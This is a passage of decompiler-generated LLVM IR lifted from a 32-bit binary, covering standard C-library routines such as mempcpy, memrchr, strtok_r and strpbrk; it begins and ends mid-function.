  %v0_10012598 = phi i32 [ 0, %entry ], [ %v0_10012598.pre, %dec_label_pc_10012594.loopexit ]
  %v0_10012594 = phi i32 [ %v1_10012568, %entry ], [ %v0_10012594.pre, %dec_label_pc_10012594.loopexit ]
  %v0_100125bc16 = phi i32 [ %v0_100125887, %entry ], [ %v0_100125bc16.ph, %dec_label_pc_10012594.loopexit ]
  %v1_10012594 = mul i32 %v0_10012594, 256
  %v1_10012598 = udiv i32 %v0_10012598, 4
  %v2_1001259c = or i32 %v1_10012594, %v0_10012594
  %v1_100125a4 = mul i32 %v2_1001259c, 65536
  %v2_100125b0 = or i32 %v1_100125a4, %v2_1001259c
  store i32 -2130640640, i32* @r7, align 4
  store i32 %v1_10012598, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10012598, 4
  br i1 %tmp, label %dec_label_pc_10012644, label %dec_label_pc_100125bc

dec_label_pc_100125bc:                            ; preds = %dec_label_pc_10012594, %dec_label_pc_10012640.backedge
  %v0_10012640 = phi i32 [ %v1_10012640, %dec_label_pc_10012640.backedge ], [ %v1_10012598, %dec_label_pc_10012594 ]
  %v0_100125c4 = phi i32 [ %v1_100125c4, %dec_label_pc_10012640.backedge ], [ %v0_10012598, %dec_label_pc_10012594 ]
  %v0_100125fc = phi i32 [ %v1_100125c0, %dec_label_pc_10012640.backedge ], [ %v0_100125bc16, %dec_label_pc_10012594 ]
  %v1_100125bc = inttoptr i32 %v0_100125fc to i32*
  %v2_100125bc = load i32, i32* %v1_100125bc, align 4
  %v1_100125c0 = add i32 %v0_100125fc, 4
  store i32 %v1_100125c0, i32* @r3, align 4
  %v1_100125c4 = add i32 %v0_100125c4, -4
  store i32 %v1_100125c4, i32* %r5.global-to-local, align 4
  %v1_100125c8 = add i32 %v0_100125fc, 1
  %v2_100125cc = xor i32 %v2_100125bc, %v2_100125b0
  %v1_100125d4 = add i32 %v2_100125cc, 2130640639
  %v2_100125d8 = xor i32 %v1_100125d4, %v2_100125cc
  %v2_100125dc = and i32 %v2_100125d8, -2130640640
  %v6_100125dc = icmp eq i32 %v2_100125dc, -2130640640
  br i1 %v6_100125dc, label %dec_label_pc_10012640.backedge, label %dec_label_pc_100125e8

dec_label_pc_10012640.backedge:                   ; preds = %dec_label_pc_100125bc, %dec_label_pc_1001262c
  %v1_10012640 = add i32 %v0_10012640, -1
  store i32 %v1_10012640, i32* %ctr.global-to-local, align 4
  %v2_10012640 = icmp eq i32 %v1_10012640, 0
  br i1 %v2_10012640, label %dec_label_pc_10012644, label %dec_label_pc_100125bc

dec_label_pc_100125e8:                            ; preds = %dec_label_pc_100125bc
  %v2_100125e8 = inttoptr i32 %v0_100125fc to i8*
  %v3_100125e8 = load i8, i8* %v2_100125e8, align 1
  %v4_100125e8 = zext i8 %v3_100125e8 to i32
  %v1_100125ec = add i32 %v0_100125fc, 3
  store i32 %v1_100125ec, i32* @r8, align 4
  %v1_100125f0 = add i32 %v0_100125fc, 2
  %v4_100125f4 = icmp eq i32 %v4_100125e8, %v0_10012594
  br i1 %v4_100125f4, label %dec_label_pc_100125fc, label %dec_label_pc_10012604

dec_label_pc_100125fc:                            ; preds = %dec_label_pc_100125e8
  ret i32 %v0_100125fc

dec_label_pc_10012604:                            ; preds = %dec_label_pc_100125e8
  %v2_10012604 = inttoptr i32 %v1_100125c8 to i8*
  %v3_10012604 = load i8, i8* %v2_10012604, align 1
  %v4_10012604 = zext i8 %v3_10012604 to i32
  %v4_10012608 = icmp eq i32 %v4_10012604, %v0_10012594
  br i1 %v4_10012608, label %dec_label_pc_10012610, label %dec_label_pc_10012618

dec_label_pc_10012610:                            ; preds = %dec_label_pc_10012604
  ret i32 %v1_100125c8

dec_label_pc_10012618:                            ; preds = %dec_label_pc_10012604
  %v2_10012618 = inttoptr i32 %v1_100125f0 to i8*
  %v3_10012618 = load i8, i8* %v2_10012618, align 1
  %v4_10012618 = zext i8 %v3_10012618 to i32
  %v4_1001261c = icmp eq i32 %v4_10012618, %v0_10012594
  br i1 %v4_1001261c, label %dec_label_pc_10012624, label %dec_label_pc_1001262c

dec_label_pc_10012624:                            ; preds = %dec_label_pc_10012618
  ret i32 %v1_100125f0

dec_label_pc_1001262c:                            ; preds = %dec_label_pc_10012618
  %v2_1001262c = inttoptr i32 %v1_100125ec to i8*
  %v3_1001262c = load i8, i8* %v2_1001262c, align 1
  %v4_1001262c = zext i8 %v3_1001262c to i32
  %v4_10012630 = icmp eq i32 %v4_1001262c, %v0_10012594
  br i1 %v4_10012630, label %dec_label_pc_10012638, label %dec_label_pc_10012640.backedge

dec_label_pc_10012638:                            ; preds = %dec_label_pc_1001262c
  ret i32 %v1_100125ec

dec_label_pc_10012644:                            ; preds = %dec_label_pc_10012640.backedge, %dec_label_pc_10012594
  %v0_1001265026 = phi i32 [ %v0_100125bc16, %dec_label_pc_10012594 ], [ %v1_100125c0, %dec_label_pc_10012640.backedge ]
  %v0_10012644 = phi i32 [ %v0_10012598, %dec_label_pc_10012594 ], [ %v1_100125c4, %dec_label_pc_10012640.backedge ]
  %v1_10012644 = add i32 %v0_10012644, 1
  store i32 %v1_10012644, i32* %r5.global-to-local, align 4
  store i32 %v0_10012644, i32* %ctr.global-to-local, align 4
  %v2_100126603 = icmp eq i32 %v0_10012644, 0
  br i1 %v2_100126603, label %dec_label_pc_10012664, label %dec_label_pc_10012650

dec_label_pc_10012650:                            ; preds = %dec_label_pc_10012644, %dec_label_pc_10012650.dec_label_pc_10012650_crit_edge
  %v1_10012654 = phi i32 [ %v1_10012654.pre, %dec_label_pc_10012650.dec_label_pc_10012650_crit_edge ], [ %v0_10012594, %dec_label_pc_10012644 ]
  %v0_10012650 = phi i32 [ %v1_1001265c, %dec_label_pc_10012650.dec_label_pc_10012650_crit_edge ], [ %v0_1001265026, %dec_label_pc_10012644 ]
  %v1_10012650 = inttoptr i32 %v0_10012650 to i8*
  %v2_10012650 = load i8, i8* %v1_10012650, align 1
  %v3_10012650 = zext i8 %v2_10012650 to i32
  %v4_10012654 = icmp eq i32 %v3_10012650, %v1_10012654
  %v0_10012658 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012654, i32 %v0_10012658)
  %v0_1001265c = load i32, i32* @r3, align 4
  %v1_1001265c = add i32 %v0_1001265c, 1
  store i32 %v1_1001265c, i32* @r3, align 4
  %v0_10012660 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012660 = add i32 %v0_10012660, -1
  store i32 %v1_10012660, i32* %ctr.global-to-local, align 4
  %v2_10012660 = icmp eq i32 %v1_10012660, 0
  br i1 %v2_10012660, label %dec_label_pc_10012664, label %dec_label_pc_10012650.dec_label_pc_10012650_crit_edge

dec_label_pc_10012650.dec_label_pc_10012650_crit_edge: ; preds = %dec_label_pc_10012650
  %v1_10012654.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012650

dec_label_pc_10012664:                            ; preds = %dec_label_pc_10012650, %dec_label_pc_10012644
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012660, { 1, 0 }
  uselistorder i32 %v1_1001265c, { 1, 0 }
  uselistorder i32 %v0_10012644, { 1, 2, 0 }
  uselistorder i32 %v1_10012640, { 2, 1, 0 }
  uselistorder i32 %v1_100125c4, { 0, 2, 1 }
  uselistorder i32 %v1_100125c0, { 0, 2, 1 }
  uselistorder i32 %v0_100125fc, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_1001259c, { 1, 0 }
  uselistorder i32 %v1_10012598, { 1, 0 }
  uselistorder i32 %v0_100125bc16, { 1, 0 }
  uselistorder i32 %v0_10012594, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10012598, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1001258c, { 1, 0 }
  uselistorder i32 %v1_10012584, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100125887, { 2, 0, 1 }
  uselistorder i32 %v1_10012568, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 2, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10012650, { 1, 0 }
  uselistorder label %dec_label_pc_10012640.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100125bc, { 1, 0 }
  uselistorder label %dec_label_pc_10012590, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268510856, i32* @lr, align 4
  %v0_10012684 = call i32 @memcpy()
  %v0_1001268c = load i32, i32* @r28, align 4
  %v1_1001268c = load i32, i32* @r29, align 4
  %v2_1001268c = add i32 %v1_1001268c, %v0_1001268c
  ret i32 %v2_1001268c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_100126a4 = urem i32 %arg2, 256
  store i32 %v1_100126a4, i32* %r4.global-to-local, align 4
  %v2_100126ac = add i32 %arg3, %arg1
  store i32 %v2_100126ac, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_100126c813 = icmp eq i32 %arg3, 0
  br i1 %v2_100126c813, label %dec_label_pc_100126d0, label %dec_label_pc_100126cc

dec_label_pc_100126b4:                            ; preds = %dec_label_pc_100126cc
  %v1_100126b4 = add i32 %v0_100126b4, -1
  %v2_100126b4 = inttoptr i32 %v1_100126b4 to i8*
  %v3_100126b4 = load i8, i8* %v2_100126b4, align 1
  %v4_100126b4 = zext i8 %v3_100126b4 to i32
  store i32 %v1_100126b4, i32* %r3.global-to-local, align 4
  %v0_100126b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_100126b8 = add i32 %v0_100126b8, -1
  store i32 %v1_100126b8, i32* %r5.global-to-local, align 4
  %v1_100126bc = load i32, i32* %r4.global-to-local, align 4
  %v4_100126bc = icmp eq i32 %v4_100126b4, %v1_100126bc
  %v0_100126c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100126bc, i32 %v0_100126c0)
  %v0_100126c4 = load i32, i32* %r3.global-to-local, align 4
  %v0_100126c8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100126c8 = add i32 %v0_100126c8, -1
  store i32 %v1_100126c8, i32* %ctr.global-to-local, align 4
  %v2_100126c8 = icmp eq i32 %v1_100126c8, 0
  br i1 %v2_100126c8, label %dec_label_pc_100126d0.loopexit, label %dec_label_pc_100126cc

dec_label_pc_100126cc:                            ; preds = %entry, %dec_label_pc_100126b4
  %v0_100126b4 = phi i32 [ %v0_100126c4, %dec_label_pc_100126b4 ], [ %v2_100126ac, %entry ]
  %v0_100126cc.in.in = phi i32 [ %v0_100126c4, %dec_label_pc_100126b4 ], [ %v2_100126ac, %entry ]
  %v0_100126cc.in = urem i32 %v0_100126cc.in.in, 4
  %v0_100126cc = icmp eq i32 %v0_100126cc.in, 0
  br i1 %v0_100126cc, label %dec_label_pc_100126d0.loopexit, label %dec_label_pc_100126b4

dec_label_pc_100126d0.loopexit:                   ; preds = %dec_label_pc_100126cc, %dec_label_pc_100126b4
  %v0_100126f816.ph = phi i32 [ %v0_100126c4, %dec_label_pc_100126b4 ], [ %v0_100126b4, %dec_label_pc_100126cc ]
  %v0_100126d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_100126d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100126d0

dec_label_pc_100126d0:                            ; preds = %dec_label_pc_100126d0.loopexit, %entry
  %v0_100126d4 = phi i32 [ 0, %entry ], [ %v0_100126d4.pre, %dec_label_pc_100126d0.loopexit ]
  %v0_100126d0 = phi i32 [ %v1_100126a4, %entry ], [ %v0_100126d0.pre, %dec_label_pc_100126d0.loopexit ]
  %v0_100126f816 = phi i32 [ %v2_100126ac, %entry ], [ %v0_100126f816.ph, %dec_label_pc_100126d0.loopexit ]
  %v1_100126d0 = mul i32 %v0_100126d0, 256
  %v1_100126d4 = udiv i32 %v0_100126d4, 4
  %v2_100126d8 = or i32 %v1_100126d0, %v0_100126d0
  %v1_100126e0 = mul i32 %v2_100126d8, 65536
  %v2_100126ec = or i32 %v1_100126e0, %v2_100126d8
  store i32 %v2_100126ec, i32* @r7, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_100126d4, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_100126d4, 4
  br i1 %tmp, label %dec_label_pc_10012770, label %dec_label_pc_100126f8

dec_label_pc_100126f8:                            ; preds = %dec_label_pc_100126d0, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge
  %v0_1001276c21 = phi i32 [ %v1_1001276c, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge ], [ %v1_100126d4, %dec_label_pc_100126d0 ]
  %v0_10012718 = phi i32 [ %v0_10012718.pre, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge ], [ -2130640640, %dec_label_pc_100126d0 ]
  %v0_10012700 = phi i32 [ %v0_10012700.pre, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge ], [ %v2_100126ec, %dec_label_pc_100126d0 ]
  %v0_100126fc = phi i32 [ %v0_100126fc.pre, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge ], [ %v0_100126d4, %dec_label_pc_100126d0 ]
  %v0_100126f8 = phi i32 [ %v0_100126f8.pre, %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge ], [ %v0_100126f816, %dec_label_pc_100126d0 ]
  %v1_100126f8 = add i32 %v0_100126f8, -4
  %v2_100126f8 = inttoptr i32 %v1_100126f8 to i32*
  %v3_100126f8 = load i32, i32* %v2_100126f8, align 4
  store i32 %v1_100126f8, i32* %r3.global-to-local, align 4
  %v1_100126fc = add i32 %v0_100126fc, -4
  store i32 %v1_100126fc, i32* %r5.global-to-local, align 4
  %v2_10012700 = xor i32 %v3_100126f8, %v0_10012700
  %v1_10012704 = add i32 %v0_100126f8, -3
  %v1_1001270c = add i32 %v2_10012700, 2130640639
  %v1_10012714 = add i32 %v0_100126f8, -2
  %v2_10012710 = sub i32 -1, %v2_10012700
  %v2_10012718 = xor i32 %v1_1001270c, %v2_10012710
  %v3_10012718 = and i32 %v2_10012718, %v0_10012718
  %v6_10012718 = icmp eq i32 %v3_10012718, 0
  %v1_1001271c = add i32 %v0_100126f8, -1
  br i1 %v6_10012718, label %dec_label_pc_1001276c.backedge, label %dec_label_pc_10012724

dec_label_pc_10012724:                            ; preds = %dec_label_pc_100126f8
  %v2_10012724 = inttoptr i32 %v1_1001271c to i8*
  %v3_10012724 = load i8, i8* %v2_10012724, align 1
  %v4_10012724 = zext i8 %v3_10012724 to i32
  %v1_10012728 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012728 = icmp eq i32 %v4_10012724, %v1_10012728
  br i1 %v4_10012728, label %dec_label_pc_10012730, label %dec_label_pc_10012738

dec_label_pc_10012730:                            ; preds = %dec_label_pc_10012724
  store i32 %v1_1001271c, i32* %r3.global-to-local, align 4
  ret i32 %v1_1001271c

dec_label_pc_10012738:                            ; preds = %dec_label_pc_10012724
  %v2_10012738 = inttoptr i32 %v1_10012714 to i8*
  %v3_10012738 = load i8, i8* %v2_10012738, align 1
  %v4_10012738 = zext i8 %v3_10012738 to i32
  %v4_1001273c = icmp eq i32 %v4_10012738, %v1_10012728
  br i1 %v4_1001273c, label %dec_label_pc_10012744, label %dec_label_pc_1001274c

dec_label_pc_10012744:                            ; preds = %dec_label_pc_10012738
  store i32 %v1_10012714, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012714

dec_label_pc_1001274c:                            ; preds = %dec_label_pc_10012738
  %v2_1001274c = inttoptr i32 %v1_10012704 to i8*
  %v3_1001274c = load i8, i8* %v2_1001274c, align 1
  %v4_1001274c = zext i8 %v3_1001274c to i32
  %v4_10012750 = icmp eq i32 %v4_1001274c, %v1_10012728
  br i1 %v4_10012750, label %dec_label_pc_10012758, label %dec_label_pc_10012760

dec_label_pc_10012758:                            ; preds = %dec_label_pc_1001274c
  store i32 %v1_10012704, i32* %r3.global-to-local, align 4
  ret i32 %v1_10012704

dec_label_pc_10012760:                            ; preds = %dec_label_pc_1001274c
  %v1_10012760 = inttoptr i32 %v1_100126f8 to i8*
  %v2_10012760 = load i8, i8* %v1_10012760, align 1
  %v3_10012760 = zext i8 %v2_10012760 to i32
  %v4_10012764 = icmp eq i32 %v3_10012760, %v1_10012728
  %v0_10012768 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012764, i32 %v0_10012768)
  %v0_1001276c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001276c.backedge

dec_label_pc_1001276c.backedge:                   ; preds = %dec_label_pc_10012760, %dec_label_pc_100126f8
  %v0_1001276c = phi i32 [ %v0_1001276c.pre, %dec_label_pc_10012760 ], [ %v0_1001276c21, %dec_label_pc_100126f8 ]
  %v1_1001276c = add i32 %v0_1001276c, -1
  store i32 %v1_1001276c, i32* %ctr.global-to-local, align 4
  %v2_1001276c = icmp eq i32 %v1_1001276c, 0
  br i1 %v2_1001276c, label %dec_label_pc_1001276c.dec_label_pc_10012770_crit_edge, label %dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge

dec_label_pc_1001276c.backedge.dec_label_pc_100126f8_crit_edge: ; preds = %dec_label_pc_1001276c.backedge
  %v0_100126f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_100126fc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10012700.pre = load i32, i32* @r7, align 4
  %v0_10012718.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100126f8

dec_label_pc_1001276c.dec_label_pc_10012770_crit_edge: ; preds = %dec_label_pc_1001276c.backedge
  %v0_10012770.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10012770

dec_label_pc_10012770:                            ; preds = %dec_label_pc_1001276c.dec_label_pc_10012770_crit_edge, %dec_label_pc_100126d0
  %v0_10012770 = phi i32 [ %v0_10012770.pre, %dec_label_pc_1001276c.dec_label_pc_10012770_crit_edge ], [ %v0_100126d4, %dec_label_pc_100126d0 ]
  %v1_10012770 = add i32 %v0_10012770, 1
  store i32 %v1_10012770, i32* %r5.global-to-local, align 4
  store i32 %v0_10012770, i32* %ctr.global-to-local, align 4
  %v2_100127883 = icmp eq i32 %v0_10012770, 0
  br i1 %v2_100127883, label %dec_label_pc_1001278c, label %dec_label_pc_1001277c

dec_label_pc_1001277c:                            ; preds = %dec_label_pc_10012770, %dec_label_pc_1001277c
  %v0_1001277c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001277c = add i32 %v0_1001277c, -1
  %v2_1001277c = inttoptr i32 %v1_1001277c to i8*
  %v3_1001277c = load i8, i8* %v2_1001277c, align 1
  %v4_1001277c = zext i8 %v3_1001277c to i32
  store i32 %v1_1001277c, i32* %r3.global-to-local, align 4
  %v1_10012780 = load i32, i32* %r4.global-to-local, align 4
  %v4_10012780 = icmp eq i32 %v4_1001277c, %v1_10012780
  %v0_10012784 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012780, i32 %v0_10012784)
  %v0_10012788 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012788 = add i32 %v0_10012788, -1
  store i32 %v1_10012788, i32* %ctr.global-to-local, align 4
  %v2_10012788 = icmp eq i32 %v1_10012788, 0
  br i1 %v2_10012788, label %dec_label_pc_1001278c, label %dec_label_pc_1001277c

dec_label_pc_1001278c:                            ; preds = %dec_label_pc_1001277c, %dec_label_pc_10012770
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10012788, { 1, 0 }
  uselistorder i32 %v0_10012770, { 1, 2, 0 }
  uselistorder i32 %v1_1001276c, { 2, 1, 0 }
  uselistorder i32 %v1_1001271c, { 1, 0, 2 }
  uselistorder i32 %v1_10012714, { 1, 0, 2 }
  uselistorder i32 %v1_10012704, { 1, 0, 2 }
  uselistorder i32 %v2_100126d8, { 1, 0 }
  uselistorder i32 %v1_100126d4, { 1, 0 }
  uselistorder i32 %v0_100126d0, { 1, 0 }
  uselistorder i32 %v0_100126d4, { 3, 2, 0, 1 }
  uselistorder i32 %v1_100126c8, { 1, 0 }
  uselistorder i32 %v0_100126c4, { 1, 0, 2 }
  uselistorder i32 %v2_100126ac, { 2, 0, 1, 3 }
  uselistorder i32 %v1_100126a4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001277c, { 1, 0 }
  uselistorder label %dec_label_pc_100126f8, { 1, 0 }
  uselistorder label %dec_label_pc_100126cc, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10012798 = load i32, i32* @lr, align 4
  store i32 %v0_10012798, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_100127a0 = icmp eq i32 %arg1, 0
  %v0_100127a8 = load i32, i32* @r5, align 4
  store i32 %v0_100127a8, i32* %r30.global-to-local, align 4
  %v0_100127ac = load i32, i32* @r4, align 4
  store i32 %v0_100127ac, i32* %r29.global-to-local, align 4
  br i1 %v3_100127a0, label %dec_label_pc_100127b4, label %dec_label_pc_100127b8

dec_label_pc_100127b4:                            ; preds = %entry
  %v1_100127b4 = inttoptr i32 %v0_100127a8 to i32*
  %v2_100127b4 = load i32, i32* %v1_100127b4, align 4
  store i32 %v2_100127b4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100127b8

dec_label_pc_100127b8:                            ; preds = %entry, %dec_label_pc_100127b4
  %v0_100127b8 = phi i32 [ %arg1, %entry ], [ %v2_100127b4, %dec_label_pc_100127b4 ]
  store i32 %v0_100127b8, i32* @r3, align 4
  %v1_100127bc = inttoptr i32 %v0_100127b8 to i8*
  %v2_100127bc = call i32 @__GI_strspn(i8* %v1_100127bc)
  %v0_100127c0 = load i32, i32* %r29.global-to-local, align 4
  %v0_100127c4 = load i32, i32* %r31.global-to-local, align 4
  %v2_100127c4 = add i32 %v0_100127c4, %v2_100127bc
  %v3_100127c4 = inttoptr i32 %v2_100127c4 to i8*
  %v4_100127c4 = load i8, i8* %v3_100127c4, align 1
  store i32 %v2_100127c4, i32* @r31, align 4
  store i32 %v2_100127c4, i32* @r3, align 4
  %v3_100127d0 = icmp eq i8 %v4_100127c4, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100127d0, label %dec_label_pc_100127dc, label %dec_label_pc_100127e4

dec_label_pc_100127dc:                            ; preds = %dec_label_pc_100127b8
  %v1_100127dc = load i32, i32* %r30.global-to-local, align 4
  %v2_100127dc = inttoptr i32 %v1_100127dc to i32*
  store i32 %v2_100127c4, i32* %v2_100127dc, align 4
  br label %dec_label_pc_1001281c

dec_label_pc_100127e4:                            ; preds = %dec_label_pc_100127b8
  store i32 268511208, i32* @lr, align 4
  %v3_100127e4 = call i32 @__GI_strpbrk(i8* %v3_100127c4, i32 %v0_100127c0)
  %v4_100127ec = icmp eq i32 %v3_100127e4, 0
  %v0_100127f0 = load i32, i32* @r31, align 4
  store i32 %v0_100127f0, i32* @r3, align 4
  %v2_100127f4 = add i32 %v3_100127e4, 1
  store i32 %v2_100127f4, i32* %r11.global-to-local, align 4
  br i1 %v4_100127ec, label %dec_label_pc_100127fc, label %dec_label_pc_1001280c

dec_label_pc_100127fc:                            ; preds = %dec_label_pc_100127e4
  store i32 268511232, i32* @lr, align 4
  %v4_100127fc = call i32 @rawmemchr(i32 %v0_100127f0, i32 0, i32 0)
  %v0_10012800 = load i32, i32* @r31, align 4
  store i32 %v0_10012800, i32* %r0.global-to-local, align 4
  %v1_10012804 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012804 = inttoptr i32 %v1_10012804 to i32*
  store i32 %v4_100127fc, i32* %v2_10012804, align 4
  br label %dec_label_pc_1001281c

dec_label_pc_1001280c:                            ; preds = %dec_label_pc_100127e4
  %v1_100127ec = inttoptr i32 %v3_100127e4 to i8*
  store i8 0, i8* %v1_100127ec, align 1
  %v0_10012814 = load i32, i32* @r31, align 4
  store i32 %v0_10012814, i32* %r0.global-to-local, align 4
  %v0_10012818 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012818 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012818 = inttoptr i32 %v1_10012818 to i32*
  store i32 %v0_10012818, i32* %v2_10012818, align 4
  br label %dec_label_pc_1001281c

dec_label_pc_1001281c:                            ; preds = %dec_label_pc_100127fc, %dec_label_pc_100127dc, %dec_label_pc_1001280c
  %v0_1001281c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10012798, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001281c

; uselistorder directives
  uselistorder i32 %v3_100127e4, { 2, 0, 1 }
  uselistorder i32 %v2_100127c4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_100127b8, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1001281c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100127b8, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100128541 = load i32, i32* @r3, align 4
  %v1_100128542 = inttoptr i32 %v0_100128541 to i8*
  %v2_100128543 = load i8, i8* %v1_100128542, align 1
  %v3_100128544 = zext i8 %v2_100128543 to i32
  store i32 %v3_100128544, i32* %r11.global-to-local, align 4
  %v3_100128586 = icmp eq i8 %v2_100128543, 0
  br i1 %v3_100128586, label %dec_label_pc_10012868, label %dec_label_pc_10012860

dec_label_pc_10012838:                            ; preds = %dec_label_pc_1001283c
  %v3_1001283c = zext i8 %v2_1001283c to i32
  %v4_10012848 = icmp eq i32 %v3_1001283c, %v1_10012848
  %v0_10012838 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10012848, i32 %v0_10012838)
  %v0_1001283c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10012848.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001283c

dec_label_pc_1001283c:                            ; preds = %dec_label_pc_10012860, %dec_label_pc_10012838
  %v1_10012848 = phi i32 [ %v1_100128489, %dec_label_pc_10012860 ], [ %v1_10012848.pre, %dec_label_pc_10012838 ]
  %v0_1001283c = phi i32 [ %tmp, %dec_label_pc_10012860 ], [ %v0_1001283c.pre, %dec_label_pc_10012838 ]
  %v1_1001283c = inttoptr i32 %v0_1001283c to i8*
  %v2_1001283c = load i8, i8* %v1_1001283c, align 1
  %v1_10012840 = add i32 %v0_1001283c, 1
  store i32 %v1_10012840, i32* %r9.global-to-local, align 4
  %v3_10012844 = icmp eq i8 %v2_1001283c, 0
  br i1 %v3_10012844, label %dec_label_pc_10012850, label %dec_label_pc_10012838

dec_label_pc_10012850:                            ; preds = %dec_label_pc_1001283c
  %v0_10012850 = load i32, i32* @r3, align 4
  %v1_10012850 = add i32 %v0_10012850, 1
  store i32 %v1_10012850, i32* @r3, align 4
  %v1_10012854 = inttoptr i32 %v1_10012850 to i8*
  %v2_10012854 = load i8, i8* %v1_10012854, align 1
  %v3_10012854 = zext i8 %v2_10012854 to i32
  store i32 %v3_10012854, i32* %r11.global-to-local, align 4
  %v3_10012858 = icmp eq i8 %v2_10012854, 0
  br i1 %v3_10012858, label %dec_label_pc_10012868, label %dec_label_pc_10012860

dec_label_pc_10012860:                            ; preds = %entry, %dec_label_pc_10012850
  %v1_100128489 = phi i32 [ %v3_10012854, %dec_label_pc_10012850 ], [ %v3_100128544, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001283c

dec_label_pc_10012868:                            ; preds = %dec_label_pc_10012850, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1001283c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012860, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
